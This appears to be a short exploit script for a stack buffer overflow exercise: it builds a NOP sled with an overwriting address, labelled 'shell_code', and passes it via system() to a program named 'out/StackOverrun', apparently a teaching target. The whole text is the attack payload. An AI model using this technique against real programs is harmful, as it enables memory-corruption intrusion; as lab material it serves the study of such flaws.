$shell_code = "\x34\x06\x40";
$arg = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x1".$shell_code;
$cmd = "out/StackOverrun ".$arg;

system($cmd);
